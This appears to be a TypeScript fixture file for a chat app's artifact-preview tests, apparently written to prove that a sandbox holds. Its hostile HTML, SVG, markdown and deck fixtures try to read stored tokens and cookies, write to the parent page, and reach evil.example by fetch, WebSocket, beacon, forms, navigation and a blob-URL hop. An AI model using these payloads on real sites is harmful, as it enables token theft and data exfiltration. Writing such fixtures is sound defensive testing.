// P5 (step 7): the artifacts the dev-only chat mock serves, and the fixtures that
// reference them. Written with the P5 bar (netzar-chat-plan/p5-proof.sh B-rows) by
// the coordinator, BEFORE the panel exists. Pure data, no I/O.
//
// Each stored artifact mirrors what the real server keeps (src/lib/chat/artifacts-repo.ts):
// URL-free descriptors, immutable versions, bytes behind an owner route. `downloadName`
// is what the real /artifacts/download route returns (downloadFileName, carried L1).
// The HOSTILE ones are the ART-09 / ART-12 fixtures: each tries every exit the
// preview must not have, and records what happened so a browser test can read it.

import type { MockSseEvent } from './fixtures';

const PPTX = 'application/vnd.openxmlformats-officedocument.presentationml.presentation';
const DOCX = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';
const CREATED = '2026-09-26T12:00:00.000Z';

export interface MockArtifactVersion {
  version: number;
  fileName: string;
  contentType: string;
  createdAt: string;
  downloadName: string;
  bytes: Buffer;
  /** view=outline answer for a deck: the JSON body, or an HTTP status the real route would send. */
  outline?: { status: 200; body: { slides: Array<{ index: number; text: string }>; truncated: boolean } }
    | { status: 422; body: { error: 'preview_unavailable' } };
}

const id = (n: number) => `f78d0000-0000-4000-8000-0000000005${String(n).padStart(2, '0')}`;
const text = (s: string) => Buffer.from(s, 'utf8');
const one = (n: number, v: Omit<MockArtifactVersion, 'version' | 'createdAt'>): [string, MockArtifactVersion[]] =>
  [id(n), [{ version: 1, createdAt: CREATED, ...v }]];

// A real 1x1 PNG.
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
// The smallest PDF a viewer opens: one empty page.
const PDF = text('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
  '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n');
// Not a real Office file: a deck's preview is the server's outline, and a memo has none.
const OFFICE_PLACEHOLDER = Buffer.from('504b0304', 'hex');

/** Every exit the page preview must not have; results land in window.__p5 for the test to read. */
const HOSTILE_PAGE = `<!doctype html><html><head><title>hostile</title>
<link rel="prefetch" href="https://evil.example/prefetch">
<link rel="stylesheet" href="https://evil.example/style.css">
<style>body{background:url(https://evil.example/bg.png)}</style>
</head><body>
<h1>Totally normal report</h1>
<img src="https://evil.example/pixel.png" alt="">
<form id="f" action="https://evil.example/form" method="post"><input name="t" value="x"></form>
<script>
var r = window.__p5 = {};
function t(name, fn) { try { r[name] = String(fn()); } catch (e) { r[name] = 'blocked:' + (e && e.name); } }
t('parentDoc', function () { return parent.document.body.innerHTML.length; });
t('topWrite', function () { top.document.body.innerHTML = 'PWNED'; return 'wrote'; });
t('storage', function () { return localStorage.getItem('cce_token'); });
t('session', function () { return sessionStorage.getItem('cce_token'); });
t('cookie', function () { return document.cookie; });
t('origin', function () { return self.origin; });
t('rtc', function () { return typeof RTCPeerConnection; });
t('fetch', function () { fetch('https://evil.example/fetch').catch(function () {}); return 'sent'; });
t('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/xhr'); x.send(); return 'sent'; });
t('ws', function () { new WebSocket('wss://evil.example/ws'); return 'sent'; });
t('beacon', function () { return navigator.sendBeacon('https://evil.example/beacon', 'x'); });
t('image', function () { new Image().src = 'https://evil.example/img.png'; return 'sent'; });
t('form', function () { document.getElementById('f').submit(); return 'sent'; });
t('popup', function () { return window.open('https://evil.example/popup'); });
t('topNav', function () { top.location.href = 'https://evil.example/top'; return 'sent'; });
t('message', function () { parent.postMessage({ type: 'netzar-export', fileName: 'x.pdf', bytes: 'AAAA' }, '*'); return 'sent'; });
// Everything above is recorded first. The navigation comes last: a refused navigation replaces this
// document, and the preview then tears the frame down, so the test reads the results before it.
setTimeout(function () { r.done = 'yes'; }, 300);
setTimeout(function () { location.href = 'https://evil.example/self'; }, 900);
</script></body></html>`;

/** A page that swaps itself for a blob document of its own making, which then tries the network. */
const BLOB_HOP_PAGE = `<!doctype html><html><body><h1>Blob hop</h1>
<script>
setTimeout(function () {
  var doc = '<script>fetch("https://evil.example/blob-hop").catch(function () {}); new Image().src = "https://evil.example/blob-hop.png";<\\/script>';
  location.href = URL.createObjectURL(new Blob([doc], { type: 'text/html' }));
}, 300);
</script></body></html>`;

/** An SVG that tries script, event handlers, a foreign iframe and external references. */
const HOSTILE_DRAWING = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100" onload="parent.__svgPwned = 1">
<script>parent.__svgPwned = 2; top.__svgPwned = 2;</script>
<image href="https://evil.example/svg-image.png" width="10" height="10"/>
<use xlink:href="https://evil.example/sprite.svg#x"/>
<foreignObject width="100" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/fo"></iframe></foreignObject>
<rect width="200" height="100" fill="#0ea5e9"/>
</svg>`;

/** Markdown that tries to pull remote media into the dashboard's own page. */
const REMOTE_NOTES = `# Remote notes

![pixel](https://evil.example/md.png)

<img src="https://evil.example/md-raw.png">

<video src="https://evil.example/v.mp4"></video>

<p style="background-image:url(https://evil.example/style-attr.png)">Styled words stay too.</p>

<svg width="10" height="10"><image href="https://evil.example/md-svg.png" width="10" height="10"/></svg>

<svg width="10" height="10"><filter id="f"><feImage href="https://evil.example/md-fe.png"/></filter><rect width="10" height="10" filter="url(#f)"/></svg>

Plain words stay.
`;

/** A page that loads from the two allowed library CDNs, and from two places it must not. */
const CDN_PAGE = `<!doctype html><html><body><h1>CDN page</h1>
<script src="https://cdn.jsdelivr.net/npm/p5-probe@1.0.0/probe.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/p5-probe/1.0.0/probe.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/attacker/repo@1/x.js"></script>
<script src="https://evil.example/lib.js"></script>
<script>window.__cdnDone = 'yes';</script>
</body></html>`;

export const mockArtifacts = new Map<string, MockArtifactVersion[]>([
  one(1, { fileName: 'Quarterly report', contentType: 'text/html', downloadName: 'Quarterly report.html',
    bytes: text('<!doctype html><html><head><title>Q3</title></head><body><h1>Quarterly report</h1><p>Revenue grew 12%.</p></body></html>') }),
  one(2, { fileName: 'Revenue chart', contentType: 'image/svg+xml', downloadName: 'Revenue chart.svg',
    bytes: text('<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><rect width="200" height="100" fill="#4f46e5"/><text x="100" y="55" fill="#fff" text-anchor="middle">Revenue</text></svg>') }),
  one(3, { fileName: 'Team photo', contentType: 'image/png', downloadName: 'Team photo.png', bytes: PNG }),
  one(4, { fileName: 'Board pack', contentType: 'application/pdf', downloadName: 'Board pack.pdf', bytes: PDF }),
  one(5, { fileName: 'Launch notes', contentType: 'text/markdown', downloadName: 'Launch notes.md',
    bytes: text('# Launch notes\n\n- Ship the **panel**\n- Keep it safe\n') }),
  one(6, { fileName: 'fibonacci.py', contentType: 'text/plain', downloadName: 'fibonacci.py',
    bytes: text('def fib(n):\n    return n if n < 2 else fib(n - 1) + fib(n - 2)\n') }),
  one(7, { fileName: 'Pipeline', contentType: 'text/csv', downloadName: 'Pipeline.csv',
    bytes: text('stage,deals\n"Qualified, hot",12\nWon,3\n') }),
  one(8, { fileName: 'Signup flow', contentType: 'text/vnd.mermaid', downloadName: 'Signup flow.mmd',
    bytes: text('graph TD\n  A[Visit] --> B[Sign up]\n') }),
  one(9, { fileName: 'Launch deck', contentType: PPTX, downloadName: 'Launch deck.pptx', bytes: OFFICE_PLACEHOLDER,
    outline: { status: 200, body: { slides: [{ index: 1, text: 'Why now' }, { index: 2, text: 'Plan Ship it' }], truncated: false } } }),
  one(10, { fileName: 'Memo', contentType: DOCX, downloadName: 'Memo.docx', bytes: OFFICE_PLACEHOLDER }),
  [id(11), [
    { version: 1, createdAt: CREATED, fileName: 'plan.md', contentType: 'text/markdown', downloadName: 'plan.md',
      bytes: text('# Plan\n\nVersion one\n') },
    { version: 2, createdAt: '2026-09-26T13:00:00.000Z', fileName: 'plan.md', contentType: 'text/markdown',
      downloadName: 'plan.md', bytes: text('# Plan\n\nVersion two\n') },
  ]],
  one(21, { fileName: 'hostile page', contentType: 'text/html', downloadName: 'hostile page.html', bytes: text(HOSTILE_PAGE) }),
  one(22, { fileName: 'hostile drawing', contentType: 'image/svg+xml', downloadName: 'hostile drawing.svg', bytes: text(HOSTILE_DRAWING) }),
  one(23, { fileName: 'bomb deck', contentType: PPTX, downloadName: 'bomb deck.pptx', bytes: OFFICE_PLACEHOLDER,
    outline: { status: 422, body: { error: 'preview_unavailable' } } }),
  one(24, { fileName: 'script deck', contentType: PPTX, downloadName: 'script deck.pptx', bytes: OFFICE_PLACEHOLDER,
    outline: { status: 200, body: { slides: [{ index: 1,
      text: '<script>window.__officePwned=1</script><img src=x onerror="window.__officePwned=2">' }], truncated: false } } }),
  one(25, { fileName: 'macro memo', contentType: DOCX, downloadName: 'macro memo.docx', bytes: OFFICE_PLACEHOLDER }),
  one(26, { fileName: 'remote notes', contentType: 'text/markdown', downloadName: 'remote notes.md', bytes: text(REMOTE_NOTES) }),
  one(27, { fileName: 'cdn page', contentType: 'text/html', downloadName: 'cdn page.html', bytes: text(CDN_PAGE) }),
  one(28, { fileName: 'blob hop', contentType: 'text/html', downloadName: 'blob hop.html', bytes: text(BLOB_HOP_PAGE) }),
]);

/** The URL-free descriptor the stream and the transcript carry for one stored version. */
export function artifactRef(artifactId: string, version = 1) {
  const v = mockArtifacts.get(artifactId)?.find((x) => x.version === version);
  if (!v) throw new Error(`no mock artifact ${artifactId} v${version}`);
  return { artifactId, version, fileName: v.fileName, contentType: v.contentType, createdAt: v.createdAt };
}

function refsTurn(reply: string, refs: Array<ReturnType<typeof artifactRef>>): MockSseEvent[] {
  return [
    { event: 'chunk', data: reply },
    { event: 'final', data: JSON.stringify({ text: reply, modelId: 'us.anthropic.claude-sonnet-4-5', latencyMs: 2100, costUsd: 0.0123, toolCallCount: 1 }) },
    ...refs.map((ref) => ({ event: 'artifact_ref', data: JSON.stringify(ref) })),
    { event: 'done', data: 'ok' },
  ];
}

export const artifactFixtures: Record<string, MockSseEvent[]> = {
  artifacts: refsTurn('Here are your files.', [1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map((n) => artifactRef(id(n)))),
  versions: refsTurn('Here is the first plan.', [artifactRef(id(11), 1)]),
  hostile: refsTurn('Here are the strange files.', [21, 22, 23, 24, 25, 26, 28].map((n) => artifactRef(id(n)))),
  cdn: refsTurn('Here is the page.', [artifactRef(id(27))]),
};
